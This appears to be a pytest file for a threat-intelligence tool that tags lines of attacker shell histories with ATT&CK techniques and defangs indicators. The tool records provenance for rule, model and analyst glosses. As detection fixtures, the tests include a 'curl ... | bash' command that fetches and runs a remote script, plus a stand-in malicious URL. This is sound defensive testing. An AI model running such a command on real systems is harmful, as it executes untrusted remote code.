from interlinear_cti import cli
from interlinear_cti.glossing import apply_rules
from interlinear_cti.model import load
from interlinear_cti.rules import load_library

AT = "2026-10-15T01:00:00Z"


def test_rules_gloss_known_lines(parse_text, resolver):
    transcript = parse_text(".bash_history", "curl -s http://203.0.113.5/x.sh | bash\ncd /tmp\nfrobnicate --all\n")
    library = load_library(resolver=resolver)
    counts = apply_rules(transcript, library, at=AT)
    first, second, third = transcript.lines
    assert first.gloss.source == "rule" and first.gloss.rule_id == "download-pipe-shell"
    assert [t.id for t in first.gloss.techniques] == ["T1105", "T1059.004"]
    assert all(t.status == "active" for t in first.gloss.techniques)
    assert [(i.type, i.value) for i in first.gloss.iocs] == [("url", "hxxp://203.0.113[.]5/x.sh"), ("ipv4", "203.0.113[.]5")]
    assert first.gloss.by == f"rules {library.version}" and first.gloss.at == AT
    assert second.gloss.source == "none" and second.gloss.techniques == []
    assert third.gloss.source == "pending"
    assert counts == {"rule": 1, "none": 1, "unmatched": 1}
    assert transcript.rules_version == library.version


def test_cli_gloss_records_dataset_versions(tmp_path, monkeypatch, resolver):
    monkeypatch.setattr("interlinear_cti.verify.CountermapResolver", lambda db=None: resolver)
    history = tmp_path / ".bash_history"
    history.write_bytes(b"whoami\nfrobnicate\n")
    path = tmp_path / "transcript.json"
    assert cli.main(["parse", str(history), "-o", str(path)]) == 0
    assert cli.main(["gloss", str(path)]) == 0
    transcript = load(path)
    assert transcript.datasets == {"attack-enterprise": "20.0"}
    assert [line.gloss.source for line in transcript.lines] == ["rule", "pending"]


import json

from interlinear_cti.glossing import apply_glosses, pending_lines

MODEL = "claude-opus-5-5"


def gloss_entry(**overrides):
    entry = {"n": 1, "meaning": "Runs an unknown tool across all targets.", "techniques": ["T1059.004"], "confidence": "low"}
    entry.update(overrides)
    return entry


def test_model_gloss_fills_a_pending_line(parse_text, resolver):
    transcript = parse_text(".bash_history", "frobnicate --all\n")
    applied, rejected = apply_glosses(transcript, [gloss_entry(note="Tool unknown; inferred.")],
                                      source="model", by=MODEL, resolver=resolver, at=AT)
    assert (applied, rejected) == (1, [])
    gloss = transcript.lines[0].gloss
    assert gloss.source == "model" and gloss.by == MODEL and gloss.note == "Tool unknown; inferred."
    assert gloss.techniques[0].status == "active" and gloss.techniques[0].name == "Unix Shell"


def test_unknown_techniques_are_rejected(parse_text, resolver):
    transcript = parse_text(".bash_history", "frobnicate --all\n")
    applied, rejected = apply_glosses(transcript, [gloss_entry(techniques=["T9999"])],
                                      source="model", by=MODEL, resolver=resolver, at=AT)
    assert (applied, rejected) == (0, ["line 1: unknown technique(s) T9999"])
    assert transcript.lines[0].gloss.source == "pending"


def test_model_glosses_never_overwrite(parse_text, resolver):
    transcript = parse_text(".bash_history", "cd /tmp\n")
    apply_rules(transcript, load_library(resolver=resolver), at=AT)
    _, rejected = apply_glosses(transcript, [gloss_entry()], source="model", by=MODEL, resolver=resolver, at=AT)
    assert rejected == ["line 1: already glossed (none); model glosses only fill pending lines"]


def test_analyst_glosses_override_and_keep_history(parse_text, resolver):
    transcript = parse_text(".bash_history", "curl -s http://203.0.113.5/x.sh | bash\n")
    apply_rules(transcript, load_library(resolver=resolver), at=AT)
    applied, _ = apply_glosses(transcript, [gloss_entry(meaning="Stages the miner.", techniques=["T1105"], confidence="high")],
                               source="analyst", by="Diego", resolver=resolver, at=AT)
    line = transcript.lines[0]
    assert applied == 1 and line.gloss.source == "analyst" and line.gloss.by == "Diego"
    assert [g.source for g in line.history] == ["rule"]


def test_context_glosses_and_defanged_iocs(parse_text, resolver):
    transcript = parse_text(".bash_history", "frobnicate --all\nfrobnicate --once\n")
    entries = [
        {"n": 1, "meaning": "Clears a local cache; context.", "context": True, "confidence": "high"},
        gloss_entry(n=2, iocs=[{"type": "url", "value": "http://evil.example.ru/a"}]),
    ]
    applied, rejected = apply_glosses(transcript, entries, source="model", by=MODEL, resolver=resolver, at=AT)
    assert (applied, rejected) == (2, [])
    # Changed by the glossing hardening (item 5): a model context gloss keeps source "model"; "none" is rules only.
    assert transcript.lines[0].gloss.source == "model" and transcript.lines[0].gloss.by == MODEL
    assert transcript.lines[1].gloss.iocs[0].value == "hxxp://evil.example[.]ru/a"


def test_invalid_entries_are_rejected_with_the_reason(parse_text, resolver):
    transcript = parse_text(".bash_history", "frobnicate --all\n")
    entry = gloss_entry()
    del entry["confidence"]
    _, rejected = apply_glosses(transcript, [entry], source="model", by=MODEL, resolver=resolver, at=AT)
    assert rejected == ["line 1: invalid entry (confidence: Field required)"]


def test_pending_lines_lists_only_pending_lines(parse_text, resolver):
    transcript = parse_text(".bash_history", "cd /tmp\nfrobnicate --all\n")
    apply_rules(transcript, load_library(resolver=resolver), at=AT)
    assert pending_lines(transcript) == [{"n": 2, "actor": "operator", "text": "frobnicate --all"}]


def test_cli_pending_and_apply_glosses(tmp_path, monkeypatch, resolver, capsys):
    monkeypatch.setattr("interlinear_cti.verify.CountermapResolver", lambda db=None: resolver)
    history = tmp_path / ".bash_history"
    history.write_bytes(b"frobnicate --all\n")
    path = tmp_path / "transcript.json"
    cli.main(["parse", str(history), "-o", str(path)])
    capsys.readouterr()
    assert cli.main(["pending", str(path)]) == 0
    assert json.loads(capsys.readouterr().out) == [{"n": 1, "actor": "operator", "text": "frobnicate --all"}]
    glosses = tmp_path / "glosses.json"
    glosses.write_text(json.dumps([gloss_entry()]), encoding="utf-8")
    assert cli.main(["apply-glosses", str(path), str(glosses), "--by", MODEL]) == 0
    assert load(path).lines[0].gloss.source == "model"
    glosses.write_text(json.dumps([gloss_entry(techniques=["T9999"])]), encoding="utf-8")
    # Changed by the glossing hardening (item 4): apply-glosses is model-only, so analyst glosses go through annotate.
    assert cli.main(["annotate", str(path), str(glosses), "--by", "Diego"]) == 1
